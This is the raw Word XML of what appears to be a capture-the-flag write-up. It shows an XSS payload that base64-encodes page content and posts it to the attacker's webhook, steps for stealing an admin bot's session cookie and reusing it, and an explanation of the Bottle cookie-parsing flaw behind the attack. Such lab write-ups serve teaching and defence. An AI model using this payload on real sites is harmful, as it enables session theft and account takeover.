      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/x-www-form-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>urlencoded</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>'},</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>body:'data</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>='+</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>btoa</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(b)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">    });</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">  });</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7121232E" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>The base64 encoding (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>btoa</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>(b)</w:t>
      </w:r>
      <w:r>
        <w:t>) ensures the data is properly transmitted, ev</w:t>
      </w:r>
      <w:r>
        <w:t>en if it contains special characters.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F4F854A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Practical Exploitation Steps</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48B918D0" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Create a note with our XSS payload</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FF9AE7D" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Report the note to be visited by the admin bot</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28A7E3D4" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Monitor our webhook for the incoming data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BDBFD94" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Extract the admin's session cookie from the received HTML</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="519BEE22" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Use the stolen session cookie to access </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>/admin/flag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="660B603F" w14:textId="02829C25" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r w:rsidRPr="001F2156">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="67ACF2EF" wp14:editId="513893D7">
            <wp:extent cx="5943600" cy="21431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83F2E" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>When we receive the data at our webhook, we'll decode the base64 and extract the session cookie from the HTML:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="691CAFEF" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="FencedCodehtml"/>
      </w:pPr>
      <w:r>
        <w:t>&lt;html lang="</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>A;lang</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>; session=f3a8d7b5c6e9a2d1b4c7e8f9a0d3b2c1|1748520123|zYxWvUtSrQpOnMlKjIhGfEdCbA; test=A"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C965711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Accessing the Flag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E96E896" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>With the admin's session cookie, we can now:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E65B248" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Set our own cookie to include the stolen session value:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E7574A9" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="FencedCodejavascript"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>document.cookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = "sessi</w:t>
      </w:r>
      <w:r>
        <w:t>on=f3a8d7b5c6e9a2d1b4c7e8f9a0d3b2c1|1748520123|zYxWvUtSrQpOnMlKjIhGfEdCbA";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B093EA7" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Access the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="InlineCode"/>
          <w:highlight w:val="none"/>
        </w:rPr>
        <w:t>/admin/flag</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> endpoint:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CB55C8B" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="FencedCodejavascript"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>location.href</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = "/admin/flag";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64AC0C19" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Retrieve the flag:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3758FF7D" w14:textId="028C8FF4" w:rsidR="006B2119" w:rsidRDefault="006B2119"/>
    <w:p w14:paraId="6C4E212B" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>RFC Discrepancie</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>s: The Root Cause</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C5B68C2" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>To understand why this vulnerability exists, we need to examine the historical evolution of cookie specifications:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29CE90F3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RFC2965 (Old Specification)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="749B9623" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>The older RFC2965 used RFC2616's definition for quoted strings:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FDBB115" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="FencedCode"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">av-pairs    =     </w:t>
      </w:r>
      <w:r>
        <w:t>av-pair *(";" av-pair)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">av-pair     =     </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>attr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> ["=" value]              ; optional value</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>attr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">        =     token</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>value       =     token | quoted-string</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>quoted-string</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">  = ( &lt;"&gt; *(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>qdtext</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> | quoted-pair ) &lt;"&gt; )</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>qdtext</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">         = &lt;any TEXT except &lt;"&gt;&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A25298C" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t xml:space="preserve">Under this </w:t>
      </w:r>
      <w:r>
        <w:t>definition, a quoted string continues until it finds a matching quote, even if semicolons (which normally separate cookies) appear inside.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EB7E587" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>RFC6265 (Modern Specification)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FED6E0A" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>The newer RFC6265 is more restrictive:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02A37B89" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="FencedCode"/>
      </w:pPr>
      <w:r>
        <w:t>cookie-pair       = cookie-name "=" cookie-valu</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>cookie-name       = token</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>cookie-value      = *cookie-octet / ( DQUOTE *cookie-octet DQUOTE )</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>cookie-octet      = %x21 / %x23-2B / %x2D-3A / %x3C-5B / %x5D-7E</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">                       ; US-ASCII characters excluding CTLs,</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">                       ; whitespac</w:t>
      </w:r>
      <w:r>
        <w:t>e DQUOTE, comma, semicolon,</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">                       ; and backslash</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54C6DAA9" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>This specification doesn't allow semicolons within cookie values, even when quoted.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BBF5F75" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t>The vulnerability emerges at the intersection of these specifications: browsers follow RFC6265 when sendi</w:t>
      </w:r>
      <w:r>
        <w:t>ng cookies, but some web frameworks (like Bottle) still use aspects of RFC2965 when parsing them.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27BE0916" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Conclusion</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="406F54F4" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:r>
        <w:t xml:space="preserve">The Bottle challenge demonstrates a sophisticated technique for bypassing </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>HttpOnly</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> cookie protection through:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A1AE4D1" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Leveraging a parser differential vuln</w:t>
      </w:r>
      <w:r>
        <w:t>erability in the Bottle framework</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44C8E70A" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Exploiting browser cookie ordering behavior with path manipulation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A543E8D" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Combining it with an XSS vulnerability to execute the attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CF091D9" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Using cookie smuggling to extract </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>HttpOnly</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> cookies</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7417F783" w14:textId="77777777" w:rsidR="006B2119" w:rsidRDefault="001F2156">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Using the stolen cookies to access protecte</w:t>
      </w:r>
      <w:r>
        <w:t>d resources</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="006B2119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00000001"/>
    <w:lvl w:ilvl="0" w:tplc="7CF8B3B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119275F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CE7E5828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5CF212F4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5DEEDABE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2646C7DC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BBE6F89A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BA3AF700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588661E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 w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="00000002"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000002"/>
    <w:lvl w:ilvl="0" w:tplc="4134EFF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98543B18">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="6B0299E6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="A7E214EA">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="CB6C85E0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="4A5AF008">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="F3A00910">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="11DEC328">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="77C6446E">
      <w:start w:val="1"/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00000003"/>
    <w:lvl w:ilvl="0" w:tplc="707CB5B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ACE470">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="31308BBA">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="CA663170">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="F31074C8">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="961C4932">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="52BA21D4">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="26981546">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="67F220D0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="3" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="00000004"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000004"/>
    <w:lvl w:ilvl="0" w:tplc="94DAF5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FAE904">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="025A7818">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="B43604C6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="8C16A82A">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="FF1C6C7C">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="6EAE8A10">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="FA9E1928">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="8DB4D4B8">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="4" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="00000005"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000005"/>
    <w:lvl w:ilvl="0" w:tplc="43A0BF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7EE35F8">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="BD948A06">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="9EAA45C8">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="73F85202">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="659C7F78">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="8E720D1A">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="DA4A0798">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="BCBAB296">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="5" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="00000006"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000006"/>
    <w:lvl w:ilvl="0" w:tplc="B28C55A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A76241A">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="5C8AB0EE">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="34B8E3D8">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="91469CD4">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="EFCE4782">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="C37AAE8E">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="EACA0CC4">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="136C5CF8">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="6" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="00000007"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000007"/>
    <w:lvl w:ilvl="0" w:tplc="B394AE6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C208104">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="F5AED7DC">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="9E5EEAAA">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="040A44BC">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="5A640E20">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="421CA71C">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="89643790">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="F334A8D2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="7" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="00000008"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00000008"/>
    <w:lvl w:ilvl="0" w:tplc="74E4B64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8B49C54">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="EA904E72">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="F1C21FC8">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="AAF61E34">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="F95032F6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="796C88DA">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="8502129E">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
